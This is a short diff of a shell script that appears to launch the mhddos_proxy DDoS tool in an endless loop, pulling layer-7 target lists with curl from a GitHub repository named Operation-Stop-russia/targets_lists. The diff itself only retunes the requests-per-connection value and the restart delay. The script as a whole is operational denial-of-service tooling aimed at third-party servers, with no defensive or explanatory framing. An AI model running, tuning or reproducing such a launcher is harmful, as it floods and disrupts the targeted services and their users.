@@ -6,13 +6,13 @@ cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
 threads="${1:-1000}"; threads="-t $threads"
-rpc="--rpc 500"
+rpc="--rpc 350"
 debug="--debug"
 
 while true
 do
    pkill -f runner.py
-   sleep 5
+   sleep 10
    list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
    while [[ $list_size = "0"  ]]
       do
